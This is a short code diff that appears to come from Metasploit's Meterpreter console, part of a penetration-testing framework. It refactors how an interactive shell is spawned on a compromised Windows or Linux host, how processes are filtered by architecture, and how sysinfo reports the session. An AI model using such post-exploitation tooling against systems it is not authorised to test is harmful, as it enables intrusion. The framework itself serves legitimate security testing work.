@@ -240,7 +240,7 @@ class Console::CommandDispatcher::Stdapi::Sys
   # as appropriate for the host.
   def cmd_shell(*args)
     case client.platform
-    when /win/
+    when 'windows'
       path = client.fs.file.expand_path("%COMSPEC%")
       path = (path and not path.empty?) ? path : "cmd.exe"
 
@@ -252,7 +252,7 @@ class Console::CommandDispatcher::Stdapi::Sys
         print_error( "Failed to spawn shell with thread impersonation. Retrying without it." )
         cmd_execute("-f", path, "-c", "-H", "-i")
       end
-    when /linux/
+    when 'linux'
       # Don't expand_path() this because it's literal anyway
       path = "/bin/sh"
       cmd_execute("-f", path, "-c", "-i")
@@ -451,7 +451,7 @@ class Console::CommandDispatcher::Stdapi::Sys
           if val.nil? or val.empty?
             return false
           end
-          searched_procs << proc if proc["arch"] == (val == 'x64' ? 'x86_64' : val)
+          searched_procs << proc if proc["arch"] == val
         end
         processes = searched_procs
       when "-s"
@@ -817,7 +817,7 @@ class Console::CommandDispatcher::Stdapi::Sys
     info.each_pair do |key, value|
       print_line("#{key.ljust(width+1)}: #{value}") if value
     end
-    print_line("#{"Meterpreter".ljust(width+1)}: #{client.platform}")
+    print_line("#{"Meterpreter".ljust(width+1)}: #{client.session_type}")
 
     return true
   end
